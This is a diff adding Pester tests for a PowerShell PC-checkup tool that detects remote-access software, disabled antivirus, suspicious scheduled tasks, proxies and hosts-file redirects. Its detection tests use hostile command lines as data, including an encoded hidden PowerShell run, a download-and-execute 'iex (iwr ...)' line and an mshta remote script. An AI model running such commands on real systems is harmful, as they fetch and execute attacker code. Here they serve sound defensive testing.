@@ -11,6 +11,26 @@ $root = Split-Path -Parent $PSScriptRoot
 . (Join-Path $root 'src\menu.ps1')
 . (Join-Path $root 'src\checks\common.ps1')
 . (Join-Path $root 'src\checks\network.ps1')
+. (Join-Path $root 'src\checks\security.ps1')
+
+# A clean PC on 26 Sep 2026; each scenario changes only what it is about.
+function New-FakeSecurity {
+    param([hashtable]$Change = @{})
+    $f = [pscustomobject]@{
+        Now = [datetime]'2026-09-26 10:00'; RemoteTools = @(); Tasks = @()
+        Antivirus = [pscustomobject]@{ Known = $true; Name = 'Microsoft Defender'; Enabled = $true; Outdated = $false; DaysOld = 0; Threats = 0 }
+        Notifications = @(); Proxy = $null; Hosts = @()
+    }
+    foreach ($k in $Change.Keys) { $f.$k = $Change[$k] }
+    $f
+}
+function New-FakeTool {
+    param([string]$Name = 'AnyDesk', $InstallDate = $null, [bool]$Running = $false, $Downloaded = $null, $LastUsed = $null)
+    [pscustomobject]@{
+        Name = $Name; Installed = [bool]$InstallDate; InstallDate = $InstallDate; Running = $Running
+        AutoStart = $false; Downloaded = $Downloaded; LastUsed = $LastUsed
+    }
+}
 
 # A healthy Wi-Fi PC; each scenario changes only what it is about.
 function New-FakeFacts {
@@ -208,12 +228,125 @@ Describe 'A3: one website' {
     }
 }
 
+Describe 'F: Test-HcSecurity' {
+    $script:Lang = 'en'
+    $all = $script:SecurityChecks['F3'].Parts
+    $cases = @(
+        @{ Name = 'a clean PC';                          Change = @{};                                                                 Finding = 'cleanAll' }
+        @{ Name = 'AnyDesk running right now';           Change = @{ RemoteTools = @(New-FakeTool -InstallDate ([datetime]'2024-01-01') -Running $true) }; Finding = 'remoteActive' }
+        @{ Name = 'AnyDesk installed two days ago';      Change = @{ RemoteTools = @(New-FakeTool -InstallDate ([datetime]'2026-09-24')) };  Finding = 'remoteRecent' }
+        @{ Name = 'AnyDesk downloaded, never installed'; Change = @{ RemoteTools = @(New-FakeTool -Downloaded ([datetime]'2026-09-20')) };   Finding = 'remoteRecent' }
+        @{ Name = 'AnyDesk removed, but used last week'; Change = @{ RemoteTools = @(New-FakeTool -LastUsed ([datetime]'2026-09-19')) };     Finding = 'remoteRecent' }
+        @{ Name = 'TeamViewer installed years ago';      Change = @{ RemoteTools = @(New-FakeTool 'TeamViewer' ([datetime]'2021-03-02')) };  Finding = 'remoteOld' }
+        @{ Name = 'virus protection off';                Change = @{ Antivirus = [pscustomobject]@{ Known = $true; Name = 'Microsoft Defender'; Enabled = $false; Outdated = $false; DaysOld = 0; Threats = 0 } }; Finding = 'defenderOff' }
+        @{ Name = 'virus protection out of date';        Change = @{ Antivirus = [pscustomobject]@{ Known = $true; Name = 'Norton'; Enabled = $true; Outdated = $true; DaysOld = $null; Threats = $null } }; Finding = 'avOld' }
+        @{ Name = 'threats stopped recently';            Change = @{ Antivirus = [pscustomobject]@{ Known = $true; Name = 'Microsoft Defender'; Enabled = $true; Outdated = $false; DaysOld = 0; Threats = 2 } }; Finding = 'threatsFound' }
+        @{ Name = 'an encoded scheduled task';           Change = @{ Tasks = @([pscustomobject]@{ Name = 'Updater'; Command = 'powershell -enc SQBFAFgA'; Level = 'strong' }) }; Finding = 'suspiciousTask' }
+        @{ Name = 'a hidden script task';                Change = @{ Tasks = @([pscustomobject]@{ Name = 'CourierAgent'; Command = 'wscript.exe x.vbs'; Level = 'weak' }) };     Finding = 'unknownTask' }
+        @{ Name = 'sites may send notifications';        Change = @{ Notifications = @([pscustomobject]@{ Browser = 'Chrome'; Site = 'https://virus-alert.example'; Since = [datetime]'2026-09-21' }) }; Finding = 'notifySites' }
+        @{ Name = 'a proxy';                             Change = @{ Proxy = '127.0.0.1:8888' };                                       Finding = 'proxy' }
+        @{ Name = 'hosts redirects';                     Change = @{ Hosts = @('www.ing.nl -> 10.0.0.9') };                            Finding = 'hostsRedirect' }
+        @{ Name = 'running tool beats everything else';  Change = @{ RemoteTools = @(New-FakeTool -Running $true); Proxy = 'x'; Antivirus = [pscustomobject]@{ Known = $true; Name = 'D'; Enabled = $false; Outdated = $false; DaysOld = 0; Threats = 0 } }; Finding = 'remoteActive' }
+    )
+    foreach ($c in $cases) {
+        It "finds '$($c.Finding)' when: $($c.Name)" {
+            (Test-HcSecurity (New-FakeSecurity $c.Change) $all 'cleanAll').FindingId | Should Be $c.Finding
+        }
+    }
+
+    It 'dates a recent tool in the finding' {
+        $r = Test-HcSecurity (New-FakeSecurity @{ RemoteTools = @(New-FakeTool -InstallDate ([datetime]'2026-09-24')) }) @('remote') 'cleanCall'
+        $r.FindingArgs[0] | Should Be 'AnyDesk'
+        $r.FindingArgs[1] | Should Be '24 Sep 2026'
+    }
+
+    It 'marks a running or recent tool as a problem, an old one as check-this' {
+        $recent = Test-HcSecurity (New-FakeSecurity @{ RemoteTools = @(New-FakeTool -InstallDate ([datetime]'2026-09-24')) }) @('remote') 'cleanCall'
+        $old = Test-HcSecurity (New-FakeSecurity @{ RemoteTools = @(New-FakeTool -InstallDate ([datetime]'2021-01-01')) }) @('remote') 'cleanCall'
+        $recent.Results[0].Status | Should Be 'problem'
+        $old.Results[0].Status | Should Be 'warn'
+    }
+
+    It 'lets well-known notification sites pass and flags only the rest' {
+        $site = { param($s) [pscustomobject]@{ Browser = 'Brave'; Site = $s; Since = [datetime]'2026-09-20' } }
+        $onlyKnown = @((& $site 'https://mail.google.com'), (& $site 'https://web.whatsapp.com'), (& $site 'http://localhost:5173'))
+        (Test-HcSecurity (New-FakeSecurity @{ Notifications = $onlyKnown }) @('notifications') 'cleanPopup').FindingId | Should Be 'cleanPopup'
+
+        $mixed = $onlyKnown + @((& $site 'https://mail.google.com.virus-alert.example'), (& $site 'https://robot-check.example'))
+        $r = Test-HcSecurity (New-FakeSecurity @{ Notifications = $mixed }) @('notifications') 'cleanPopup'
+        $r.FindingId | Should Be 'notifySites'
+        $r.FindingArgs[0] | Should Be 2
+    }
+
+    It 'does not treat a look-alike domain as known' {
+        Test-HcKnownSite 'https://calendar.google.com' | Should Be $true
+        Test-HcKnownSite 'https://www.facebook.com' | Should Be $true
+        Test-HcKnownSite 'https://mail.google.com.virus-alert.example' | Should Be $false
+        Test-HcKnownSite 'https://notmarktplaats.nl' | Should Be $false
+    }
+
+    It 'uses each problem''s own clean finding' {
+        (Test-HcSecurity (New-FakeSecurity) $script:SecurityChecks['F1'].Parts 'cleanPopup').FindingId | Should Be 'cleanPopup'
+        (Test-HcSecurity (New-FakeSecurity) $script:SecurityChecks['F2'].Parts 'cleanCall').FindingId | Should Be 'cleanCall'
+    }
+
+    It 'never shows a missing-string marker, in either language' {
+        foreach ($lang in @('en', 'nl')) {
+            $script:Lang = $lang
+            foreach ($c in $cases) {
+                $r = Test-HcSecurity (New-FakeSecurity $c.Change) $all 'cleanAll'
+                @($r.Results | Where-Object { $_.Text -match '\[\w+\.\w+\]' }).Count | Should Be 0
+            }
+        }
+        $script:Lang = 'en'
+    }
+}
+
+Describe 'F: reading the PC' {
+    $tasks = @(
+        @{ Exe = 'powershell.exe';  Args = '-NoP -W Hidden -enc SQBFAFgA';                      Level = 'strong' }
+        @{ Exe = 'powershell.exe';  Args = '-c "iex (iwr http://x.example/a.ps1)"';            Level = 'strong' }
+        @{ Exe = 'mshta.exe';       Args = 'https://x.example/run.hta';                         Level = 'strong' }
+        @{ Exe = 'C:\Users\Public\svc.exe'; Args = '';                                          Level = 'strong' }
+        @{ Exe = 'wscript.exe';     Args = '"C:\Users\shami\AppData\Local\Reveille\start-agent-hidden.vbs"'; Level = 'weak' }
+        @{ Exe = 'C:\Users\shami\AppData\Local\Programs\Opera GX\autoupdate\opera_autoupdate.exe'; Args = '--scheduledtask'; Level = $null }
+        @{ Exe = 'shutdown.exe';    Args = '/r /fw /t 5';                                       Level = $null }
+    )
+    foreach ($t in $tasks) {
+        It "rates '$($t.Exe) $($t.Args)' as $(if ($t.Level) { $t.Level } else { 'fine' })" {
+            Get-HcTaskLevel $t.Exe $t.Args | Should Be $t.Level
+        }
+    }
+
+    It 'reads install dates from the registry format' {
+        ConvertFrom-HcInstallDate '20260924' | Should Be ([datetime]'2026-09-24')
+        ConvertFrom-HcInstallDate '' | Should Be $null
+        ConvertFrom-HcInstallDate '24-09-2026' | Should Be $null
+    }
+
+    It 'lists hosts-file redirects but not localhost' {
+        $hosts = Join-Path $TestDrive 'hosts-f'
+        Set-Content $hosts @('# comment', '127.0.0.1 localhost', '::1 localhost', '10.0.0.9 www.ing.nl ing.nl')
+        @(Get-HcHostsRedirects $hosts) | Should Be @('www.ing.nl -> 10.0.0.9', 'ing.nl -> 10.0.0.9')
+    }
+
+    It 'has no remote tool pattern that matches everyday programs' {
+        $everyday = @('Google Chrome', 'Microsoft Edge', 'Mozilla Firefox', 'VLC media player', 'Microsoft 365', 'LogMeIn Hamachi', 'Zoom Workplace', 'WhatsApp', 'Opera GX', 'Steam')
+        foreach ($tool in $script:RemoteToolList | Where-Object { $_.Pattern }) {
+            foreach ($name in $everyday) { $name -match $tool.Pattern | Should Be $false }
+        }
+    }
+}
+
 Describe 'Findings' {
     It 'has a finding and an advice sentence, in both languages, for every finding id in the code' {
         $code = Get-Content (Join-Path $root 'src\checks\network.ps1') | Where-Object { $_ -match 'Set-HcFinding' }
         # The id right after "Set-HcFinding $r", or inside "{ 'id' }" when it is chosen by an if.
-        $ids = @($code | ForEach-Object { [regex]::Matches($_, "(?:Set-HcFinding \`$r |\{ )'(\w+)'") | ForEach-Object { $_.Groups[1].Value } }) | Sort-Object -Unique
-        $ids.Count | Should BeGreaterThan 10
+        $ids = @($code | ForEach-Object { [regex]::Matches($_, "(?:Set-HcFinding \`$r |\{ )'(\w+)'") | ForEach-Object { $_.Groups[1].Value } })
+        $ids += $script:SecurityPriority
+        $ids += @($script:SecurityChecks.Values | ForEach-Object { $_.Clean })
+        $ids = $ids | Sort-Object -Unique
+        $ids.Count | Should BeGreaterThan 25
         foreach ($lang in @('en', 'nl')) {
             foreach ($id in $ids) {
                 $script:Strings[$lang]["finding.$id"] | Should Not BeNullOrEmpty
@@ -253,8 +386,15 @@ Describe 'Start-Housecall (scripted run)' {
     Mock Get-HcWifiDrops { 2 }
     Mock Get-HcSiteFacts { [pscustomobject]@{ Host = 'nu.nl'; HostsEntry = $null; Address = '1.2.3.4'; TcpMs = 12; HttpStatus = 200 } }
 
+    Mock Get-HcSecurityFacts { New-FakeSecurity @{ RemoteTools = @(New-FakeTool -InstallDate ([datetime]'2026-09-24') -Running $true) } }
+
     It 'walks the menu in English without errors and ends on Q' {
         { Start-Housecall -Lang en -Answers @('A', '1', '', '0', 'F2', '', '?', '', 'zz', 'Q') } | Should Not Throw
+    }
+
+    It 'runs F1, F2 and F3 from the menu' {
+        { Start-Housecall -Lang nl -Answers @('F1', '', 'F2', '', 'F3', '', 'Q') } | Should Not Throw
+        Assert-MockCalled Get-HcSecurityFacts -Times 3 -Exactly -Scope It
     }
 
     It 'runs A1, A2 and A3 from the menu' {
